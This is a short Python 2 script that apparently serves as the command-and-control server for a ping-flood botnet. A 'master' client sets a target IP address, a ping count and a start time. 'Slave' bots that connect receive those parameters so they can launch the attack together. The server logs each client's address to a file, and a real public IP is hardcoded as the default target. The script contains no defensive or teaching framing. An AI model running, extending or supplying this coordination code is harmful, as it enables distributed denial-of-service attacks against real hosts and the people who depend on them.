#!/usr/bin/python2
from socket import *
import threading
import thread
import sys
import time
import datetime

master='master'
slave='slave'
global ipAdd
global numPing
global ping_time
ipAdd ='198.252.11.70'
numPing = 5
ping_time = "2013-03-13-13-32-0"

def handler(clientsock,addr):
	while 1:
			global ipAdd
			global numPing
			global ping_time
			data = clientsock.recv(BUFSIZ)
				#		clientsock.send(msg)
			print >>sys.stderr, '\nReceived: "%s"' % data
			if data == master:
				ipAdd = clientsock.recv(BUFSIZ)
				print >>sys.stderr, 'New IP Address: "%s" ' % ipAdd
				#time.sleep(2)
				numPing = str(clientsock.recv(BUFSIZ))
				print >>sys.stderr, 'Number of Pings: "%s"' % numPing
				ping_time = clientsock.recv(BUFSIZ)
				clientsock.send('\n\nConfirmed IP Address: "%s" ' % ipAdd)
				clientsock.send('\nConfirmed Number of Pings: "%s" ' % numPing)
				clientsock.send('\nConfirmed Ping Time: "%s" ' % ping_time)
				break
			elif data == slave:
				clientsock.send(ipAdd)
				#time.sleep(2)
				clientsock.send(str(numPing))
				#time.sleep(2)
				print >>sys.stderr, 'Attacking %s with %s Pings' % (ipAdd, numPing)
				clientsock.send(str(ping_time))
				break
			else:
				print >>sys.stderr, 'Invalid Access From: ', clientsock
				break
	print '\nWaiting For Connections'
	clientsock.close()

if __name__=='__main__':
	HOST = 'localhost'
	#HOST = '198.252.11.72'  USE THIS
	PORT = 35000
	BUFSIZ = 1024
	ADDR = (HOST, PORT)
	serversock = socket(AF_INET, SOCK_STREAM)
	print >>sys.stderr, 'Starting Up On: %s => Port: %s' % ADDR
	print 'Waiting For Connections'
	serversock.bind(ADDR)
	serversock.listen(2)

	while 1:
		clientsock, addr = serversock.accept()
		f=open('client_address_list','a')
		f.write(str(addr) + '\n')
		f.close()

		print '\nConnection From: ', addr
		thread.start_new_thread(handler, (clientsock, addr))

